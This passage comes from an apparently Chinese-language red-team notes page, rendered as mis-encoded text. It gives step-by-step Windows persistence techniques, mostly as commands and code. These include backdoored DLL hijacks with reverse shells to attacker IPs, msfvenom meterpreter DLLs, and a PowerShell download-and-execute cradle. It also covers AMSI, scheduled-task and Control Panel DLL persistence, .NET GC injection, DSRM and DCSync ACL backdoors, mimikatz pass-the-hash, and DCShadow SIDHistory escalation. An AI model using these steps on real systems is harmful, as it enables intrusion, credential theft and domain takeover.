2.ä½¿ç”¨Process ExploreræŸ¥çœ‹è¯¥åº”ç”¨ç¨‹åºå¯åŠ¨ååŠ è½½çš„DLLã€‚
3.ä»å·²ç»åŠ è½½çš„DLLåˆ—è¡¨ä¸­ï¼ŒæŸ¥æ‰¾åœ¨ä¸Šè¿°â€œKnownDLLsæ³¨å†Œè¡¨é¡¹â€ä¸­ä¸å­˜åœ¨çš„DLLã€‚
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
4.ç¼–å†™ç¬¬ä¸‰æ­¥ä¸­è·å–åˆ°çš„DLLçš„åŠ«æŒDLLã€‚
5.å°†ç¼–å†™å¥½çš„åŠ«æŒDLLæ”¾åˆ°è¯¥åº”ç”¨ç¨‹åºç›®å½•ä¸‹ï¼Œé‡æ–°å¯åŠ¨è¯¥åº”ç”¨ç¨‹åºï¼Œæ£€æµ‹æ˜¯å¦åŠ«æŒæˆåŠŸã€‚
</code></pre>
<p><img src="./img/467.png" alt="image"></p>
<pre><code>Explorer.exeå¯åŠ¨è°ƒç”¨winraræ–‡ä»¶å¤¹çš„RarExt.dll
Msfç›‘å¬
</code></pre>
<p><img src="./img/468.png" alt="image"></p>
<pre><code>å¤åˆ¶dllæ–‡ä»¶åˆ°the-backdoor-factoryæ–‡ä»¶å¤¹ä¸­ï¼ŒåŠ è½½æ¶æ„dllè¿›åŸdll
&gt;python backdoor.py -f RarExt.dll -s reverse_shell_tcp_inline -P 12138 -H 192.168.0.107 æŒ‡å®šä¸ºkaliç›‘å¬çš„IPå’Œç«¯å£
</code></pre>
<p><img src="./img/469.png" alt="image"></p>
<pre><code>ç”Ÿæˆå¥½çš„dllåœ¨backdooredæ–‡ä»¶å¤¹ï¼Œä¼ å…¥é¶æœºä¸­ï¼Œæ›¿æ¢åŸdllæ–‡ä»¶ï¼Œæœ€å¥½æŠŠåŸdllä¿å­˜å¤‡ä»½ã€‚
æ¯æ¬¡æ‰“å¼€windowsèµ„æºç®¡ç†å™¨çš„æ—¶å€™ï¼Œå³å¯ä¸Šçº¿ã€‚é‡å¯å¯ç»´æŒ
</code></pre>
<p><img src="./img/470.png" alt="image"></p>
<h4 id="åŠ«æŒ2"><a href="#åŠ«æŒ2" class="headerlink" title="åŠ«æŒ2"></a>åŠ«æŒ2</h4><pre><code>ä½¿ç”¨
https://github.com/coca1ne/DLL_Hijacker
https://github.com/git20150901/DLLHijack_Detecter
æŸ¥çœ‹è¦åŠ«æŒçš„DLLçš„å‡½æ•°å¯¼å‡ºè¡¨ï¼Œä¼šç›´æ¥ç”Ÿæˆcppæºç ï¼Œé‡ç¼–è¯‘æŒ‡å‘æ¶æ„ä»£ç 
DLLHijack_Detecterå¯æŸ¥çœ‹ç¨‹åºåŠ è½½çš„ä¸åœ¨KnownDLLsä¸­çš„DLL
</code></pre>
<h4 id="MSDTCæœåŠ¡åŠ«æŒ"><a href="#MSDTCæœåŠ¡åŠ«æŒ" class="headerlink" title="MSDTCæœåŠ¡åŠ«æŒ"></a>MSDTCæœåŠ¡åŠ«æŒ</h4><pre><code>æœåŠ¡åç§°MSDTC,æ˜¾ç¤ºåç§°Distributed Transaction Coordinator
å¯¹åº”è¿›ç¨‹msdtc.exe,ä½äº%windir%system32
C:\Windows\System32\wbem\
æœåŠ¡å¯åŠ¨æœç´¢æ³¨å†Œè¡¨ä½ç½®è®¡ç®—æœº\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.51 LPORT=4444 -f dll -o /var/www/html/oci.dll
Oci.dllæ”¾å…¥c:\windows\system32\
é‡å¯æœåŠ¡å³å¯
&gt;taskkill /f /im msdtc.exe
</code></pre>
<h4 id="Rattler"><a href="#Rattler" class="headerlink" title="Rattler"></a>Rattler</h4><pre><code>è‡ªåŠ¨åŒ–æŸ¥æ‰¾å¯åŠ«æŒçš„DLL
https://github.com/sensepost/rattler
ä½¿ç”¨
&gt;Rattler_x64.exe calc.exe 1
ä¼šåˆ—å‡ºå¯è¢«åŠ«æŒçš„DLL
</code></pre>
<p><img src="./img/471.png" alt="image"></p>
<pre><code>æŒ‰ç¨‹åºè¯»å–DLLä½ç½®é¡ºåºï¼ŒæŠŠæ¶æ„DLLæ”¾å…¥ç¨‹åºåŒç›®å½•åï¼Œæ‰§è¡Œç¨‹åºå³å¯ã€‚
</code></pre>
<p><img src="./img/472.png" alt="image"><br><img src="./img/473.png" alt="image"></p>
<h3 id="DLLä»£ç†åŠ«æŒå³é”®"><a href="#DLLä»£ç†åŠ«æŒå³é”®" class="headerlink" title="DLLä»£ç†åŠ«æŒå³é”®"></a>DLLä»£ç†åŠ«æŒå³é”®</h3><pre><code>å³é”®å¯¹åº”çš„æ³¨å†Œè¡¨è·¯å¾„æ˜¯
HKLM\Software\Classes\*\ShellEx\ContextMenuHandlers
ä½¿ç”¨autorunsæŸ¥çœ‹åŠ è½½çš„DLL
</code></pre>
<p><img src="./img/474.png" alt="image"></p>
<pre><code>ä»¥rarext.dllä¸ºä¾‹
ä½¿ç”¨https://github.com/rek7/dll-hijackingåˆ›å»ºä»£ç†DLL
æ³¨æ„ä¿®æ”¹parse.pyä¸­dumpbin.exeçš„ä½ç½®
</code></pre>
<p><img src="./img/475.png" alt="image"></p>
<pre><code>&gt;python3 parse.py -d rarext.dll
</code></pre>
<p><img src="./img/476.png" alt="image"></p>
<pre><code>ä¿®æ”¹åŸDLLä¸ºrarext_.dllï¼Œé‡æ–°ç”Ÿæˆè§£å†³æ–¹æ¡ˆå‘½åä¸ºrarext.dll
å°†ä¸¤ä¸ªDLLæ”¾å…¥åŸç›®å½•ï¼Œé‡å¯
</code></pre>
<h3 id="ä½¿ç”¨AMSIæ‰«ææ¥å£ç»´æŒæƒé™"><a href="#ä½¿ç”¨AMSIæ‰«ææ¥å£ç»´æŒæƒé™" class="headerlink" title="ä½¿ç”¨AMSIæ‰«ææ¥å£ç»´æŒæƒé™"></a>ä½¿ç”¨AMSIæ‰«ææ¥å£ç»´æŒæƒé™</h3><pre><code>https://gist.github.com/b4rtik/48ef702603d5e283bc81a05a01fccd40
ç°amsiå·²ç»é›†æˆåˆ°win10ä»¥ä¸‹ç»„ä»¶ä¸­
UAC
PowerShell
Windowsè„šæœ¬ï¼ˆwscript.exeå’Œcscript.exeï¼‰
JavaScriptå’ŒVBScript
Office VBAå®
</code></pre>
<p><img src="./img/721.png" alt="image"></p>
<pre><code>è¿™é‡Œä½¿ç”¨ncæ¥åå¼¹ä¸ªshell
</code></pre>
<p><img src="./img/722.png" alt="image"></p>
<pre><code>ä½¿ç”¨regsvr32æ³¨å†Œdllæˆ–æ‰‹åŠ¨æ·»åŠ 
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\GUIDï¼ˆé»˜è®¤ï¼‰REG_SZ â€œæä¾›ç¨‹åºæè¿°â€
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\GUID\InprocServer32 (é»˜è®¤)
REG_EXPAND_SZ &quot; DLLçš„è·¯å¾„&quot; -ThreadingModel REG_SZ &quot;Both&quot;
HKLM \ SOFTWARE \ Microsoft \ AMSI \ Providers \ GUID
Regsvr32ä½¿ç”¨è¶…ç®¡æƒé™
</code></pre>
<p><img src="./img/723.png" alt="image"></p>
<pre><code>ä¸€æ—¦æ³¨å†Œï¼ŒDllå°†è¢«åŠ è½½åˆ°ä»»ä½•æ¶‰åŠAMSIå’ŒSampleAmsiProvider::Scanæ–¹æ³•çš„è¿›ç¨‹ä¸­ï¼Œæ¯”å¦‚åœ¨ç¨‹åºä¸­è®¾å®šï¼Œåœ¨powershellä¸‹å‘é€å­—ç¬¦ä¸²ï¼Œè§¦å‘scanæ–¹æ³•ï¼Œå½“å‘é€å­—ç¬¦ä¸²ä¸ºæˆ‘ä»¬è®¾å®šçš„å­—ç¬¦ä¸²çš„æ—¶å€™å°±è§¦å‘æ¶æ„DLL
</code></pre>
<p><img src="./img/724.png" alt="image"><br><img src="./img/725.png" alt="image"></p>
<h3 id="DLLåŠ«æŒè®¡åˆ’ä»»åŠ¡"><a href="#DLLåŠ«æŒè®¡åˆ’ä»»åŠ¡" class="headerlink" title="DLLåŠ«æŒè®¡åˆ’ä»»åŠ¡"></a>DLLåŠ«æŒè®¡åˆ’ä»»åŠ¡</h3><pre class="line-numbers language-none"><code class="language-none">function Invoke-ScheduledTaskComHandlerUserTask
&#123;
[CmdletBinding(SupportsShouldProcess &#x3D; $True, ConfirmImpact &#x3D; &#39;Medium&#39;)]
Param (
[Parameter(Mandatory &#x3D; $True)]
[ValidateNotNullOrEmpty()]
[String]
$Command,

[Switch]
$Force
)
$ScheduledTaskCommandPath &#x3D; &quot;HKCU:\Software\Classes\CLSID\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\InprocServer32&quot;
if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &#39;(default)&#39; -ErrorAction SilentlyContinue) -eq $null))&#123;
New-Item $ScheduledTaskCommandPath -Force |
New-ItemProperty -Name &#39;(Default)&#39; -Value $Command -PropertyType string -Force | Out-Null
&#125;else&#123;
Write-Verbose &quot;Key already exists, consider using -Force&quot;
exit
&#125;

if (Test-Path $ScheduledTaskCommandPath) &#123;
Write-Verbose &quot;Created registry entries to hijack the UserTask&quot;
&#125;else&#123;
Write-Warning &quot;Failed to create registry key, exiting&quot;
exit
&#125; 
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\test\testmsg.dll&quot; -Verbose
é‡å¯æƒé™å¯ç»´æŒ
</code></pre>
<h3 id="DLLæ³¨å…¥"><a href="#DLLæ³¨å…¥" class="headerlink" title="DLLæ³¨å…¥"></a>DLLæ³¨å…¥</h3><h4 id="Powershell-6"><a href="#Powershell-6" class="headerlink" title="Powershell"></a>Powershell</h4><pre><code>ç”ŸæˆDLL
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=6666 -f dll -o /var/www/html/x.dll
&gt;use exploit/multi/handler
&gt;set payload windows/x64/meterpreter/reverse_tcp
&gt;Powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.105/powersploit/CodeExecution/Invoke-DllInjection.ps1&#39;); Invoke-DllInjection -ProcessID pid -Dll .\1.dll&quot;
</code></pre>
<h4 id="InjectProc"><a href="#InjectProc" class="headerlink" title="InjectProc"></a>InjectProc</h4><pre><code>ç”ŸæˆDLL
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f dll -o /var/www/html/qq.dll
#use exploit/multi/handler
#set payload windows/x64/meterpreter/reverse_tcp
ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ³¨å…¥è¿›ç¨‹
&gt;InjectProc.exe dll_inj qq.dll xx.exe(å­˜åœ¨çš„è¿›ç¨‹)
</code></pre>
<p><img src="./img/477.png" alt="image"></p>
<h3 id="é€šè¿‡æ§åˆ¶é¢æ¿åŠ è½½é¡¹ç»´æŒæƒé™"><a href="#é€šè¿‡æ§åˆ¶é¢æ¿åŠ è½½é¡¹ç»´æŒæƒé™" class="headerlink" title="é€šè¿‡æ§åˆ¶é¢æ¿åŠ è½½é¡¹ç»´æŒæƒé™"></a>é€šè¿‡æ§åˆ¶é¢æ¿åŠ è½½é¡¹ç»´æŒæƒé™</h3><pre><code>ç¼–è¯‘ä¸ºdllï¼Œè¿™é‡Œæ˜¯å¼¹æ¡†æµ‹è¯•
</code></pre>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"pch.h"</span></span>

<span class="token comment">//Cplapplet</span>
<span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token function">__declspec</span><span class="token punctuation">(</span>dllexport<span class="token punctuation">)</span> LONG <span class="token function">Cplapplet</span><span class="token punctuation">(</span>
    HWND hwndCpl<span class="token punctuation">,</span>
    UINT msg<span class="token punctuation">,</span>
    LPARAM lParam1<span class="token punctuation">,</span>
    LPARAM lParam2
<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"inject control panel."</span><span class="token punctuation">,</span> <span class="token string">"Control Panel"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

BOOL APIENTRY <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span>
    DWORD  ul_reason_for_call<span class="token punctuation">,</span>
    LPVOID lpReserved
<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>ul_reason_for_call<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    <span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">Cplapplet</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">case</span> DLL_THREAD_ATTACH<span class="token operator">:</span>
    <span class="token keyword">case</span> DLL_THREAD_DETACH<span class="token operator">:</span>
    <span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="./img/680.png" alt="image"></p>
<pre><code>æ·»åŠ åˆ°æ³¨å†Œè¡¨ä¸­ï¼Œåªè¦è¿è¡Œcontrolå‘½ä»¤æ‰“å¼€æ§åˆ¶é¢æ¿å³å¯åŠ è½½dll
reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs&quot; /v spotless /d &quot;C:\xxx\dll.dll&quot; /f
</code></pre>
<p><img src="./img/681.png" alt="image"></p>
<h2 id="é€šè¿‡è‡ªå®šä¹‰-netåƒåœ¾å›æ”¶æœºåˆ¶è¿›è¡ŒDLLæ³¨å…¥"><a href="#é€šè¿‡è‡ªå®šä¹‰-netåƒåœ¾å›æ”¶æœºåˆ¶è¿›è¡ŒDLLæ³¨å…¥" class="headerlink" title="é€šè¿‡è‡ªå®šä¹‰.netåƒåœ¾å›æ”¶æœºåˆ¶è¿›è¡ŒDLLæ³¨å…¥"></a>é€šè¿‡è‡ªå®šä¹‰.netåƒåœ¾å›æ”¶æœºåˆ¶è¿›è¡ŒDLLæ³¨å…¥</h2><pre><code>ä½æƒé™ç”¨æˆ·å¯æŒ‡å®š.netåº”ç”¨ç¨‹åºä½¿ç”¨è‡ªå®šä¹‰åƒåœ¾æ”¶é›†å™¨ï¼ˆGCï¼‰ï¼Œä¸€ä¸ªè‡ªå®šä¹‰GCå¯ä»¥ä»¥COMPLUS_GCNameæ­¤ç¯å¢ƒå˜é‡æŒ‡å®šï¼Œåªéœ€å°†æ­¤ç¯å¢ƒå˜é‡æŒ‡å‘åˆ°æ¶æ„DLLï¼Œè‡ªå®šä¹‰GCçš„DLLéœ€è¦ä¸€ä¸ªåä¸ºGC_VersionInfoçš„å¯¼å‡ºè¡¨ã€‚
ä¸‹é¢æ˜¯ä¸ªå¼¹æ¡†DLL
</code></pre>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>

BOOL APIENTRY <span class="token function">DllMain</span><span class="token punctuation">(</span> HMODULE hModule<span class="token punctuation">,</span>
                       DWORD  ul_reason_for_call<span class="token punctuation">,</span>
                       LPVOID lpReserved
                     <span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>ul_reason_for_call<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    <span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>
    <span class="token keyword">case</span> DLL_THREAD_ATTACH<span class="token operator">:</span>
    <span class="token keyword">case</span> DLL_THREAD_DETACH<span class="token operator">:</span>
    <span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">struct</span> <span class="token class-name">VersionInfo</span>
<span class="token punctuation">&#123;</span>
    UINT32 MajorVersion<span class="token punctuation">;</span>
    UINT32 MinorVersion<span class="token punctuation">;</span>
    UINT32 BuildVersion<span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> Name<span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token function">__declspec</span><span class="token punctuation">(</span>dllexport<span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">GC_VersionInfo</span><span class="token punctuation">(</span>VersionInfo <span class="token operator">*</span> info<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    info<span class="token operator">-></span>BuildVersion <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    info<span class="token operator">-></span>MinorVersion <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    info<span class="token operator">-></span>BuildVersion <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"giao"</span><span class="token punctuation">,</span> <span class="token string">"giao"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="./img/686.png" alt="image"></p>
<pre><code>åæ‰§è¡Œä»»æ„.netç¨‹åºå¯åŠ è½½æ­¤DLL
</code></pre>
<p><img src="./img/687.png" alt="image"></p>
<pre><code>å½“ç„¶ä¹Ÿå¯ä»¥åŠ è½½shellcode
https://github.com/am0nsec/MCGC
</code></pre>
<p><img src="./img/688.png" alt="image"><br><img src="./img/689.png" alt="image"><br><img src="./img/690.png" alt="image"></p>
<h3 id="Windows-FAX-DLL-Injection"><a href="#Windows-FAX-DLL-Injection" class="headerlink" title="Windows FAX DLL Injection"></a>Windows FAX DLL Injection</h3><pre><code>æ¶æ„DLLæ”¹åä¸ºfxsst.dllæ”¾ç½®åœ¨c:\windows\ç›®å½•å³å¯å®ç°å¯¹explorer.exeçš„åŠ«æŒ
</code></pre>
<h3 id="DSRM-æ³¨å†Œè¡¨ACLåé—¨"><a href="#DSRM-æ³¨å†Œè¡¨ACLåé—¨" class="headerlink" title="DSRM+æ³¨å†Œè¡¨ACLåé—¨"></a>DSRM+æ³¨å†Œè¡¨ACLåé—¨</h3><pre><code>&gt;reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2
å…è®¸DSRMè´¦æˆ·è¿œç¨‹è®¿é—®
https://github.com/HarmJ0y/DAMP
æ•ˆæœï¼šåŸŸå†…ä»»ä½•ç”¨æˆ·å¯è¯»å–åŸŸæ§hash
systemæƒé™æ‰§è¡Œ
&gt;psexec.exe -accepteula -s -i -d cmd.exe
åŸŸæ§åˆ¶å™¨æ‰§è¡Œ
PS&gt;Add-RemoteRegBackdoor -ComputerName åŸŸæ§å -Trustee &#39;S-1-1-0&#39; â€“Verbose
</code></pre>
<p><img src="./img/478.png" alt="image"></p>
<pre><code>åŸŸå†…æœºå™¨æ‰§è¡Œ
https://raw.githubusercontent.com/HarmJ0y/DAMP/master/RemoteHashRetrieval.ps1
PS&gt; Get-RemoteLocalAccountHash -ComputerName åŸŸæ§ â€“Verbose
</code></pre>
<p><img src="./img/479.png" alt="image"></p>
<pre><code>åŸŸæ§ä¸Šæ‰§è¡Œ
&gt;reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2
</code></pre>
<p><img src="./img/480.png" alt="image"></p>
<pre><code>PTHæ”»å‡»ï¼Œmimikatzéœ€ä»¥ç®¡ç†å‘˜èº«ä»½å¯åŠ¨
&gt;mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /domain:dc /user:Administrator /ntlm:9f1770aebd442b6b624bdfe9cbc720dd&quot; exit
</code></pre>
<p><img src="./img/481.png" alt="image"></p>
<h3 id="DCShadow-amp-SID-History"><a href="#DCShadow-amp-SID-History" class="headerlink" title="DCShadow&amp;SID History"></a>DCShadow&amp;SID History</h3><pre><code>http://192.168.0.107/ps/nishang/ActiveDirectory/Set-DCShadowPermissions.ps1
DCShadowæ”»å‡»æ˜¯é€šè¿‡æ›´æ”¹ADæ¶æ„ï¼Œä½¿åŸŸå†…ä¸€å°æœºå™¨ä¼ªé€ æˆåŸŸæ§ã€‚
æ­¤è„šæœ¬å¯ä»¥é€šè¿‡ä¿®æ”¹ADå¯¹è±¡æä¾›DCShadowæ”»å‡»çš„æœ€å°æƒé™ã€‚
è¿è¡Œæ­¤è„šæœ¬éœ€è¦DA(Domain Administrator)æƒé™ï¼Œå¯ä»¥ä½¿æŒ‡å®šç”¨æˆ·ä¸éœ€è¦DAæƒé™ä½¿ç”¨mimikatzã€‚
åŸŸæ§ï¼šdc.zone.com
åŸŸå†…æœºå™¨ï¼šsub2k8.zone.com
åŸŸå†…æ™®é€šç”¨æˆ·:y
åŸŸæ§æ‰§è¡Œ
&gt;Set-DCShadowPermissions -Fakedc sub2k8 -Object dc -username y â€“Verbose
æ³¨å†Œsub2k8ä¸ºå‡DCï¼Œç»™äºˆç”¨æˆ·yä»sub2k8ä¿®æ”¹dcçš„è®¡ç®—æœºå¯¹è±¡çš„æƒé™ã€‚
</code></pre>
<p><img src="./img/482.png" alt="image"></p>
<pre><code>åœ¨sub2k8ä¸Šï¼Œä»¥æœ¬åœ°systemæƒé™å¯åŠ¨ä¸€ä¸ªmimikatzä¼šè¯ï¼Œä»¥zone\yæƒé™å¯åŠ¨ä¸€ä¸ªmimikatzä¼šè¯ã€‚
</code></pre>
<p><img src="./img/483.png" alt="image"><br><img src="./img/484.png" alt="image"></p>
<pre><code>Systemæƒé™çª—å£æ‰§è¡Œdcshadowæ”»å‡»ï¼Œä¿®æ”¹dcçš„è®¡ç®—æœºå±æ€§
Zone\yæƒé™çª—å£ç”¨äºæ¨é€
æ·»åŠ åŸŸç®¡ç†
é€šè¿‡ä¿®æ”¹å®‰å…¨æ ‡è¯†ç¬¦ï¼Œå°†åŸŸå†…æ™®é€šç”¨æˆ·yæå‡ä¸ºåŸŸç®¡ç†ç”¨æˆ·
&gt;lsadump::dcshadow /object:y /attribute:primaryGroupID /value:512
</code></pre>
<p><img src="./img/485.png" alt="image"><br><img src="./img/486.png" alt="image"><br><img src="./img/487.png" alt="image"></p>
<pre><code>Zone\yæ¨é€
&gt;lsadump::dcshadow /push
</code></pre>
<p><img src="./img/488.png" alt="image"></p>
<pre><code>æ­¤æ—¶åœ¨åŸŸæ§ä¸ŠæŸ¥è¯¢å¯è§yç”¨æˆ·å·²ç»åŠ å…¥åŸŸç®¡ç†ç»„ã€‚
</code></pre>
<p><img src="./img/489.png" alt="image"></p>
<pre><code>æ·»åŠ SIDHistoryåé—¨
è®°å½•åŸŸç®¡ç†SID
</code></pre>
<p><img src="./img/490.png" alt="image"></p>
<pre><code>&gt;Set-DCShadowPermissions -FakeDC sub2k8 -Object y -Username y -Verbose
</code></pre>
<p><img src="./img/491.png" alt="image"></p>
<pre><code>&gt;lsadump::dcshadow /object:y /attribute:sidhistory /value:S-1-5-21-2346829310-1781191092-2540298887-500
æ¨é€
&gt;lsadump::dcshadow /push
</code></pre>
<p><img src="./img/492.png" alt="image"></p>
<pre><code>æµ‹è¯•
</code></pre>
<p><img src="./img/493.png" alt="image"></p>
<pre><code>åŸŸæ§ä¸­é€šè¿‡mimikatzå‘½ä»¤å¯æŸ¥è¯¢åˆ°SIDHistory
</code></pre>
<p><img src="./img/494.png" alt="image"></p>
<pre><code>åˆ é™¤SIDHistoryçš„æ–¹æ³•
PS&gt;Get-ADUser -Filter &#123;name -eq &quot;y&quot;&#125; â€“Properties sidhistory|foreach &#123;Set-ADuser $_ â€“remove @&#123;sidhistory=&quot;S-1-5-21-2346829310-1781191092-2540298887-500&quot;&#125;&#125;
</code></pre>
<p><img src="./img/495.png" alt="image"><br><img src="./img/496.png" alt="image"></p>
<pre><code>åˆ é™¤åŠŸèƒ½è§„åˆ™
è¾“å…¥çš„è§„åˆ™åé¢åŠ å‚æ•°-removeå³å¯ã€‚
</code></pre>
<p><img src="./img/497.png" alt="image"></p>
<h3 id="DCSyncåé—¨"><a href="#DCSyncåé—¨" class="headerlink" title="DCSyncåé—¨"></a>DCSyncåé—¨</h3><pre><code>æœåŠ¡å™¨ç®¡ç†å™¨æ‰¾åˆ°åŸŸ-&gt;æŸ¥çœ‹-&gt;å¯ç”¨é«˜çº§åŠŸèƒ½-&gt;å³é”®å±æ€§-&gt;å®‰å…¨-&gt;everyoneå®Œå…¨æ§åˆ¶
&gt;mimikatz.exe &quot;lsadump::dcsync /domain:zone.com /user:administrator&quot; exit
</code></pre>
<p><img src="./img/498.png" alt="image"></p>
<pre><code>æˆ–ä½¿ç”¨powerviewæ·»åŠ ä¸€æ¡ACL(åŸŸæ§æ‰§è¡Œ)
&gt;Add-DomainObjectAcl -TargetIdentity &quot;DC=ZONE,DC=COM&quot; -PrincipalIdentity åŸŸå†…ç”¨æˆ· -Rights DCSync -Verbose 
</code></pre>
<p><img src="./img/499.png" alt="image"></p>
<pre><code>ä½¿ç”¨æ­¤è´¦æˆ·åœ¨åŸŸå†…ä»»æ„ä¸»æœºå¯ä½¿ç”¨mimikatzçš„dcsyncåŠŸèƒ½å¯¼å‡ºå‡­æ®
</code></pre>
<p><img src="./img/500.png" alt="image"></p>
<pre><code>ç§»é™¤ACL
&gt;Remove-DomainObjectAcl -TargetIdentity &quot;DC=zone,DC=com&quot; -PrincipalIdentity ç”¨æˆ· -Rights DCSync -Verbose
</code></pre>
<h3 id="Netsh-Helper-DLL"><a href="#Netsh-Helper-DLL" class="headerlink" title="Netsh Helper DLL"></a>Netsh Helper DLL</h3><pre><code>https://github.com/outflanknl/NetshHelperBeacon
https://github.com/rtcrowley/Offensive-Netsh-Helper
</code></pre>
<h4 id="MSFvenomç”ŸæˆDLL"><a href="#MSFvenomç”ŸæˆDLL" class="headerlink" title="MSFvenomç”ŸæˆDLL"></a>MSFvenomç”ŸæˆDLL</h4><pre><code>ç”ŸæˆDLLæ ¼å¼æœ¨é©¬
</code></pre>
<p><img src="./img/501.png" alt="image"></p>
<pre><code>ä¼ è‡³é¶æœºæ‰§è¡Œå‘½ä»¤
&gt;netsh add helper C:\Windows\Temp\help.dll
</code></pre>
<p><img src="./img/502.png" alt="image"></p>
<h4 id="MSF-web-delivery"><a href="#MSF-web-delivery" class="headerlink" title="MSF+web_delivery"></a>MSF+web_delivery</h4><pre><code>å…³é—­netshæƒé™ä¸ä¼šæ‰ï¼Œè°ƒç”¨çš„powershell
#use exploit/multi/script/web_delivery
&gt;set target 2            #PSH
&gt;set payload windows/x64/meterpreter/reverse_tcp
&gt;set lhost 192.168.0.107
&gt;set lport 12345
</code></pre>
<p><img src="./img/503.png" alt="image"></p>
<pre><code>Visual Studioæ–°å»ºç©ºç™½DLLé¡¹ç›®ï¼Œæºæ–‡ä»¶æ·»åŠ ç°æœ‰æ–‡ä»¶
https://github.com/rtcrowley/Offensive-Netsh-Helper/blob/master/netshlep.cpp 
å¤åˆ¶ç”Ÿæˆçš„ä»£ç è¿›æ–‡ä»¶ä¸­ï¼Œé…ç½®ç®¡ç†å™¨æ–°å»ºx64ä½æ•°åç”Ÿæˆè§£å†³æ–¹æ¡ˆï¼Œé…ç½®ç±»å‹é€‰æ‹©ä½åŠ¨æ€åº“å¤åˆ¶DLLåˆ°é¶æœºæ‰§è¡Œ
</code></pre>
